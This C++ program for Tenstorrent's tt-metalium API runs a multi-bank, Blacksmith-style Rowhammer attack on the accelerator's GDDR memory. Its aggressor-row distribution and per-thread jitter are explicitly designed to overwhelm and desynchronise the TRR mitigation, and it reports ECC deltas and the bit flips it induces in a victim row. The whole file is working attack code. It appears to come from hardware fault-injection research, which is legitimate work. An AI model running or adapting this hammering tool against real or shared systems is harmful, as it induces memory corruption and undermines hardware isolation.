// SPDX-FileCopyrightText: © 2026
// SPDX-License-Identifier: Apache-2.0
//
// Peak-config Blacksmith-style attack (multi-bank).
//
// Combines the empirical peak per-row config (3 sub-ports × T tiles dual-RISC
// per channel) with non-uniform timing à la Blacksmith (S&P 2022). Each
// thread gets its OWN aggressor pair AND its own jitter delay so that:
//   - The aggressors collectively span many same-bank rows (V±1, V±2, ...
//     V±7) — overflows TRR's per-bank tracking table.
//   - V±1 is hammered hardest (most threads) — concentrates flip-inducing
//     activations on the immediate neighbors.
//   - Per-thread jitter desynchronizes the temporal pattern so TRR's
//     periodicity detector can't lock on.
//
// Modes:
//   --mode uniform    : all threads on V-1, V+1 (peak baseline)
//   --mode blacksmith : threads distributed across V±1..V±7 with jitter
//
// Multi-bank:
//   --banks 1 (default): single-channel test (matches original validation).
//   --banks N (1..8)   : N channels, each with its own victim row + per-thread
//                        Blacksmith distribution scaled to threads-per-channel.
//                        Default --tiles-per-sp drops to 5 when --banks > 1
//                        so 8×3×5=120 tiles fits the 130-worker pool.

#include <algorithm>
#include <array>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>

#include <fmt/core.h>

#include <tt-metalium/host_api.hpp>
#include <tt-metalium/tt_metal.hpp>
#include <tt-metalium/device.hpp>
#include <tt-metalium/distributed.hpp>
#include <tt-metalium/allocator.hpp>
#include <tt-metalium/hal_types.hpp>

using namespace tt;
using namespace tt::tt_metal;

static constexpr uint32_t ROW_SIZE          = 8192;
static constexpr uint32_t CACHELINE         = 64;
static constexpr double   NS_PER_CYCLE      = 1.25;
static constexpr uint32_t ROWS_PER_BANK     = 16;
static constexpr uint32_t L1_ALIGN          = 64;

static constexpr uint32_t RESULT_HDR_WORDS  = 6;
static constexpr uint32_t MAX_FLIP_RECORDS  = 32;
static constexpr uint32_t FLIP_RECORD_WORDS = 4;
static constexpr uint32_t RESULT_BUF_WORDS  = RESULT_HDR_WORDS + MAX_FLIP_RECORDS * FLIP_RECORD_WORDS;

struct SubPort { uint32_t noc_x; uint32_t noc_y; };
struct ChannelEndpoints { const char* name; std::array<SubPort, 3> sp; };
static const ChannelEndpoints CHANNELS[8] = {
    {"ch0", {{ {0,0}, {0,1},  {0,11} }}},
    {"ch1", {{ {0,2}, {0,10}, {0,3}  }}},
    {"ch2", {{ {0,9}, {0,4},  {0,8}  }}},
    {"ch3", {{ {0,5}, {0,7},  {0,6}  }}},
    {"ch4", {{ {9,0}, {9,1},  {9,11} }}},
    {"ch5", {{ {9,2}, {9,10}, {9,3}  }}},
    {"ch6", {{ {9,9}, {9,4},  {9,8}  }}},
    {"ch7", {{ {9,5}, {9,7},  {9,6}  }}},
};

#ifndef OVERRIDE_KERNEL_PREFIX
#define OVERRIDE_KERNEL_PREFIX ""
#endif

struct EccCounters {
    uint32_t corr[4]; uint32_t uncorr; bool valid;
    uint32_t total_corr() const { return corr[0]+corr[1]+corr[2]+corr[3]; }
};
static EccCounters read_ecc() {
    EccCounters ec{}; ec.valid = false;
    const char* cmd =
        "python3 -c \"from pyluwen import PciChip; "
        "t=PciChip(pci_interface=0).get_telemetry(); "
        "print(t.gddr01_corr_errs, t.gddr23_corr_errs, "
              "t.gddr45_corr_errs, t.gddr67_corr_errs, t.gddr_uncorr_errs)"
        "\" 2>/dev/null";
    FILE* p = popen(cmd, "r"); if (!p) return ec;
    char buf[256];
    if (fgets(buf, sizeof(buf), p)) {
        if (sscanf(buf, "%u %u %u %u %u", &ec.corr[0], &ec.corr[1],
                   &ec.corr[2], &ec.corr[3], &ec.uncorr) == 5) ec.valid = true;
    }
    pclose(p);
    return ec;
}

static std::vector<CoreCoord> compute_grid_workers(distributed::MeshDevice* mesh) {
    CoreCoord g = mesh->compute_with_storage_grid_size();
    std::vector<CoreCoord> out; out.reserve(g.x * g.y);
    for (uint32_t y = 0; y < g.y; y++)
        for (uint32_t x = 0; x < g.x; x++) out.push_back({x, y});
    return out;
}

// Pick aggressor pair for a given thread under Blacksmith distribution,
// proportionally scaled to threads_per_ch (preserves V±1-heavy concentration).
// Reference distribution (96 threads): 32@V±1, 16@V±2, 12@V±3, 12@V±4,
// 8@V±5, 8@V±6, 8@V±7. For T threads per channel, cumulative thresholds are
// scaled by T/96 (last bucket forced to T to absorb rounding).
static uint32_t pick_aggressor_distance(uint32_t thread_idx, uint32_t threads_per_ch) {
    static const uint32_t base_cumulative[] = {32, 48, 60, 72, 80, 88, 96};
    static const uint32_t distance[]        = { 1,  2,  3,  4,  5,  6,  7};
    for (uint32_t i = 0; i < 7; i++) {
        uint32_t scaled = (i == 6) ? threads_per_ch
                                   : (base_cumulative[i] * threads_per_ch) / 96;
        if (thread_idx < scaled) return distance[i];
    }
    return 7;
}

int main(int argc, char** argv) {
    uint32_t start_channel = 0;
    uint32_t num_banks     = 1;             // default = single-channel (matches original validation)
    uint32_t tiles_per_sp  = 16;            // user can override; we adjust default if banks>1
    bool     tiles_set     = false;
    uint32_t start_row     = 2000;
    uint32_t hammer_iters  = 2000000;
    uint32_t data_pattern  = 0x55555555;
    uint32_t base_jitter   = 16;
    std::string mode       = "blacksmith";

    for (int i = 1; i < argc; i++) {
        if      (!std::strcmp(argv[i], "--channel")       && i+1 < argc) start_channel = std::atoi(argv[++i]);
        else if (!std::strcmp(argv[i], "--banks")         && i+1 < argc) num_banks = std::atoi(argv[++i]);
        else if (!std::strcmp(argv[i], "--tiles-per-sp")  && i+1 < argc) { tiles_per_sp = std::atoi(argv[++i]); tiles_set = true; }
        else if (!std::strcmp(argv[i], "--start-row")     && i+1 < argc) start_row = std::atoi(argv[++i]);
        else if (!std::strcmp(argv[i], "--iterations")    && i+1 < argc) hammer_iters = std::atoi(argv[++i]);
        else if (!std::strcmp(argv[i], "--pattern")       && i+1 < argc) data_pattern = std::strtoul(argv[++i], nullptr, 0);
        else if (!std::strcmp(argv[i], "--jitter")        && i+1 < argc) base_jitter = std::atoi(argv[++i]);
        else if (!std::strcmp(argv[i], "--mode")          && i+1 < argc) mode = argv[++i];
        else if (!std::strcmp(argv[i], "--help")) {
            fmt::print("Usage: {} [--channel N] [--banks N] [--tiles-per-sp N] [--start-row N]\n"
                       "              [--iterations N] [--pattern HEX] [--jitter N]\n"
                       "              [--mode uniform|blacksmith]\n"
                       "  --banks 1 (default): single channel, 16 tiles/sp = 96 threads\n"
                       "  --banks 8: all channels, default 5 tiles/sp = 240 threads (30/ch)\n", argv[0]);
            return 0;
        }
    }
    if (start_channel >= 8 || num_banks < 1) return 1;
    if (start_channel + num_banks > 8) num_banks = 8 - start_channel;
    // For multi-bank, drop default tiles/sp to fit 130 worker pool: 8*3*5=120
    if (num_banks > 1 && !tiles_set) tiles_per_sp = 5;

    bool blacksmith = (mode == "blacksmith");

    constexpr int device_id = 0;
    auto mesh = distributed::MeshDevice::create_unit_mesh(device_id);
    auto& cq  = mesh->mesh_command_queue();
    IDevice* dev = mesh->get_devices()[0];
    auto workers = compute_grid_workers(mesh.get());
    uint32_t tiles_per_bank = 3 * tiles_per_sp;
    uint32_t need_tiles = num_banks * tiles_per_bank;
    if (workers.size() < need_tiles) {
        fmt::print(stderr, "ERROR: need {} tiles ({}b * 3sp * {}t) but only {} available\n",
                   need_tiles, num_banks, tiles_per_sp, workers.size());
        return 1;
    }

    uint32_t l1_base = dev->allocator()->get_base_allocator_addr(tt_metal::HalMemType::L1);
    uint32_t result_size = RESULT_BUF_WORDS * sizeof(uint32_t);
    uint32_t b_scratch = (l1_base + L1_ALIGN - 1) & ~(L1_ALIGN - 1);
    uint32_t b_result  = (b_scratch + 3 * CACHELINE + L1_ALIGN - 1) & ~(L1_ALIGN - 1);
    uint32_t n_scratch = (b_result + result_size + L1_ALIGN - 1) & ~(L1_ALIGN - 1);
    uint32_t n_result  = (n_scratch + 3 * CACHELINE + L1_ALIGN - 1) & ~(L1_ALIGN - 1);

    uint32_t dram_base = dev->allocator()->get_base_allocator_addr(tt_metal::HalMemType::DRAM);
    uint32_t min_safe_row = (dram_base / ROW_SIZE) + 2;
    if (start_row < min_safe_row) start_row = min_safe_row;
    uint32_t bank_start = (start_row / ROWS_PER_BANK) * ROWS_PER_BANK;
    uint32_t victim_row = bank_start + ROWS_PER_BANK / 2;  // row 8 within bank, same across banks
    uint32_t victim_addr = victim_row * ROW_SIZE;

    uint32_t threads_per_ch = tiles_per_bank * 2;
    uint32_t total_threads  = num_banks * threads_per_ch;

    fmt::print("╔══════════════════════════════════════════════════════════════╗\n");
    fmt::print("║       Peak Blacksmith-Style Attack ({} bank{}, mode={})\n",
               num_banks, num_banks > 1 ? "s" : "", mode);
    fmt::print("╠══════════════════════════════════════════════════════════════╣\n");
    fmt::print("║  Banks:           {} (channels {}..{})\n",
               num_banks, start_channel, start_channel + num_banks - 1);
    fmt::print("║  Sub-ports/bank:  3 (all NOC endpoints per channel)\n");
    fmt::print("║  Tiles/sub-port:  {} (× 2 RISCs = {} threads/channel)\n",
               tiles_per_sp, threads_per_ch);
    fmt::print("║  Total threads:   {} on {} tiles\n", total_threads, need_tiles);
    fmt::print("║  Victim row:      {} (0x{:08x}) per channel\n", victim_row, victim_addr);
    fmt::print("║  Mode:            {}\n", mode);
    if (blacksmith) {
        fmt::print("║    aggressor dist (per channel): scaled from 32@V±1..8@V±7 to {} threads\n",
                   threads_per_ch);
        fmt::print("║    per-thread jitter: {}..{} cycles\n", base_jitter, base_jitter * 5);
    } else {
        fmt::print("║    all threads on V±1 (uniform baseline)\n");
    }
    fmt::print("║  Iterations:      {} sweeps/thread = {} acts/thread\n",
               hammer_iters, hammer_iters * 2);
    fmt::print("║  Pattern:         0x{:08x}\n", data_pattern);
    fmt::print("╚══════════════════════════════════════════════════════════════╝\n\n");

    fmt::print("[Step 1] Pre-attack ECC counters\n");
    EccCounters ecc_pre = read_ecc();
    if (ecc_pre.valid)
        fmt::print("  corr ch01:{} ch23:{} ch45:{} ch67:{}  uncorr:{}\n",
                   ecc_pre.corr[0], ecc_pre.corr[1], ecc_pre.corr[2], ecc_pre.corr[3], ecc_pre.uncorr);

    fmt::print("\n[Step 2] Launching {} hammer ({} threads × {} acts)…\n",
               mode, total_threads, hammer_iters * 2);

    std::vector<CoreCoord> sel(workers.begin(), workers.begin() + need_tiles);
    std::set<CoreRange> ranges;
    for (auto& c : sel) ranges.insert(CoreRange(c, c));
    CoreRangeSet core_set(ranges);

    Program prog = CreateProgram();
    KernelHandle b_kid = CreateKernel(
        prog, std::string(OVERRIDE_KERNEL_PREFIX) + "rowhammer/kernels/core_scaling_refsync_kernel.cpp",
        core_set,
        DataMovementConfig{ .processor = DataMovementProcessor::RISCV_0,
                            .noc       = NOC::RISCV_0_default });
    KernelHandle n_kid = CreateKernel(
        prog, std::string(OVERRIDE_KERNEL_PREFIX) + "rowhammer/kernels/core_scaling_refsync_kernel.cpp",
        core_set,
        DataMovementConfig{ .processor = DataMovementProcessor::RISCV_1,
                            .noc       = NOC::RISCV_1_default });

    std::vector<uint32_t> distance_count(8, 0);

    // Tile assignment: bank b → sub-port s → tile i; global_tile = b*tiles_per_bank + s*tiles_per_sp + i.
    // Per-bank primary thread is BRISC of (s=0, i=0) — gets core_id=0 → writes pattern + verifies.
    for (uint32_t b = 0; b < num_banks; b++) {
        const auto& ch = CHANNELS[start_channel + b];
        for (uint32_t s = 0; s < 3; s++) {
            const auto& sp = ch.sp[s];
            for (uint32_t i = 0; i < tiles_per_sp; i++) {
                uint32_t tile_in_bank = s * tiles_per_sp + i;
                uint32_t global_tile  = b * tiles_per_bank + tile_in_bank;
                // Per-channel thread index for distribution choice
                uint32_t b_idx_in_ch = tile_in_bank * 2 + 0;
                uint32_t n_idx_in_ch = tile_in_bank * 2 + 1;
                uint32_t b_dist = blacksmith ? pick_aggressor_distance(b_idx_in_ch, threads_per_ch) : 1;
                uint32_t n_dist = blacksmith ? pick_aggressor_distance(n_idx_in_ch, threads_per_ch) : 1;
                distance_count[b_dist]++;
                distance_count[n_dist]++;
                // Jitter uses GLOBAL thread index so each bank gets desynchronized too
                uint32_t b_global_idx = global_tile * 2 + 0;
                uint32_t n_global_idx = global_tile * 2 + 1;
                uint32_t b_delay = blacksmith ? (base_jitter + (b_global_idx * 7) % (base_jitter * 4)) : 0;
                uint32_t n_delay = blacksmith ? (base_jitter + (n_global_idx * 7) % (base_jitter * 4)) : 0;
                uint32_t b_aggr_lo = victim_addr - b_dist * ROW_SIZE;
                uint32_t b_aggr_hi = victim_addr + b_dist * ROW_SIZE;
                uint32_t n_aggr_lo = victim_addr - n_dist * ROW_SIZE;
                uint32_t n_aggr_hi = victim_addr + n_dist * ROW_SIZE;

                bool is_primary = (s == 0 && i == 0);
                uint32_t b_core_id = is_primary ? 0 : (global_tile * 2 + 100);
                uint32_t n_core_id = global_tile * 2 + 101;

                std::vector<uint32_t> b_args = {
                    sp.noc_x, sp.noc_y, victim_addr,
                    hammer_iters, data_pattern,
                    b_scratch, b_result,
                    b_core_id, b_delay,
                    2u, b_aggr_lo, b_aggr_hi,
                };
                SetRuntimeArgs(prog, b_kid, sel[global_tile], b_args);

                std::vector<uint32_t> n_args = {
                    sp.noc_x, sp.noc_y, victim_addr,
                    hammer_iters, data_pattern,
                    n_scratch, n_result,
                    n_core_id, n_delay,
                    2u, n_aggr_lo, n_aggr_hi,
                };
                SetRuntimeArgs(prog, n_kid, sel[global_tile], n_args);
            }
        }
    }

    if (blacksmith) {
        fmt::print("  thread distribution (all banks combined) by aggressor distance:");
        for (uint32_t d = 1; d <= 7; d++) fmt::print(" V±{}={}", d, distance_count[d]);
        fmt::print("\n");
    }

    distributed::MeshWorkload wl;
    wl.add_program(distributed::MeshCoordinateRange(mesh->shape()), std::move(prog));
    distributed::EnqueueMeshWorkload(cq, wl, false);
    distributed::Finish(cq);
    fmt::print("  hammer complete\n");

    fmt::print("\n[Step 3] Post-attack ECC counters\n");
    EccCounters ecc_post = read_ecc();
    if (ecc_post.valid)
        fmt::print("  corr ch01:{} ch23:{} ch45:{} ch67:{}  uncorr:{}\n",
                   ecc_post.corr[0], ecc_post.corr[1], ecc_post.corr[2], ecc_post.corr[3], ecc_post.uncorr);
    if (ecc_pre.valid && ecc_post.valid) {
        uint32_t d_tot = ecc_post.total_corr() - ecc_pre.total_corr();
        uint32_t d_unc = ecc_post.uncorr - ecc_pre.uncorr;
        if (d_tot > 0 || d_unc > 0)
            fmt::print("  *** ECC delta: +{} corrected, +{} uncorrectable\n", d_tot, d_unc);
        else
            fmt::print("  ECC delta: no new errors\n");
    }

    fmt::print("\n[Step 4] Per-bank verification + aggregate\n");
    uint64_t total_acts = 0, max_cycles = 0;
    uint32_t total_flips = 0;
    for (uint32_t b = 0; b < num_banks; b++) {
        const auto& ch = CHANNELS[start_channel + b];
        // Primary = BRISC of first tile of first sub-port in this bank
        uint32_t primary_global = b * tiles_per_bank;
        std::vector<uint32_t> rv;
        detail::ReadFromDeviceL1(dev, sel[primary_global], b_result, result_size, rv);
        uint32_t flips    = rv[1];
        uint32_t bitflips = rv[2];
        total_flips += flips;

        uint64_t bank_acts = 0;
        for (uint32_t t = 0; t < tiles_per_bank; t++) {
            std::vector<uint32_t> rb, rn;
            detail::ReadFromDeviceL1(dev, sel[b * tiles_per_bank + t], b_result, result_size, rb);
            detail::ReadFromDeviceL1(dev, sel[b * tiles_per_bank + t], n_result, result_size, rn);
            bank_acts += rb[5] + rn[5];
            uint64_t cyc_b = (static_cast<uint64_t>(rb[4]) << 32) | rb[3];
            uint64_t cyc_n = (static_cast<uint64_t>(rn[4]) << 32) | rn[3];
            if (cyc_b > max_cycles) max_cycles = cyc_b;
            if (cyc_n > max_cycles) max_cycles = cyc_n;
        }
        total_acts += bank_acts;

        double bank_M = (max_cycles > 0) ? bank_acts / (max_cycles * NS_PER_CYCLE / 1e9) / 1e6 : 0.0;
        fmt::print("  bank{} {}: {} flipped CLs, {} bit-flips, {} acts ({:.2f} M act/s)\n",
                   b, ch.name, flips, bitflips, bank_acts, bank_M);
        if (flips > 0) {
            fmt::print("    *** FLIPS DETECTED on {} ***\n", ch.name);
            uint32_t n = std::min(flips, MAX_FLIP_RECORDS);
            for (uint32_t r = 0; r < n; r++) {
                uint32_t base = RESULT_HDR_WORDS + r * FLIP_RECORD_WORDS;
                fmt::print("      flip CL{} word{}: expected 0x{:08x} got 0x{:08x}\n",
                           rv[base], rv[base+1], rv[base+2], rv[base+3]);
            }
        }
    }

    double aggr_M = (max_cycles > 0)
        ? total_acts / (max_cycles * NS_PER_CYCLE / 1e9) / 1e6 : 0.0;
    double max_ms = max_cycles * NS_PER_CYCLE / 1e6;

    fmt::print("\n[Summary]\n");
    fmt::print("  Total real activations:  {} (~{:.2f}B)\n", total_acts, total_acts / 1e9);
    fmt::print("  Max wall time:           {:.1f} ms\n", max_ms);
    fmt::print("  Aggregate rate:          {:.2f} M act/s\n", aggr_M);
    fmt::print("  Total bit flips:         {}\n", total_flips);

    mesh->close();
    return 0;
}
